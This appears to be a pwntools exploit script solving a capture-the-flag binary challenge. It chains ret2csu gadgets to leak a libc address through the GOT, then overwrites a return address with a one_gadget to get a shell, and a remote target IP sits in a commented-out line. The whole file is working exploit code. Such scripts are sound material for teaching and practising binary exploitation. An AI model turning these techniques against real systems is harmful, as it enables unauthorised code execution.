#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *
# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall', checksec=False)
def start(argv=[], *a, **kw):
	'''Start the exploit against the target.'''
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe.path] + argv, *a, **kw)

def call(rdi, rsi, rdx, func, exit):
	return [
	p64(0x401292), # csu_1
	p64(0),
	p64(1),
	p64(rdi),
	p64(rsi),
	p64(rdx),
	p64(func),
	p64(0x401278), # csu_2
	p64(0),
	p64(1),
	p64(0),
	p64(0),
	p64(0),
	p64(0),
	p64(exit),
	p64(exit)
	]

# io = remote('188.166.177.88', 11101)
io = process("./chall")
# libc = ELF('libc1.so', checksec=False)
libc = exe.libc
rop = ROP(exe.path, checksec=False)
GOT_WRITE = 0x403fd0
GOT_READ = 0x403fe0
MAIN = 0x401220
START = 0x404068

io.sendafter('yow: ', b'\x90' * 16)
payload = call(1, GOT_READ, 6, GOT_WRITE, MAIN)

gdb.attach(io,"b *0x40121e")

io.sendafter('yaharo: ', p64(0x401203) + p64(START) + p64(0x401207))

for i, pay in enumerate(payload):
	if i == 0:
		START += 8
		io.send(pay + p64(0x404198) + p64(0x401207))
	else:
		io.send(pay + p64(START) + p64(0x401207))
		io.send(pay + p64(0x404198) + p64(0x401207))
		START += 8

io.send(b'A' * 8 + p64(0x404060-0x8) + p64(0x40121e))
leak = u64(io.recv(6).ljust(8, b'\x00'))
log.info(f"read: {hex(leak)}")
libc.address = leak - libc.symbols['read']
log.info(f"libc: {hex(libc.address)}")
onegadget = libc.address + 0xcbd1a
io.sendlineafter('yow: ', b'\x90' * 5)
io.sendlineafter('yaharo: ', b'A' * 16 + p64(onegadget))
io.interactive()
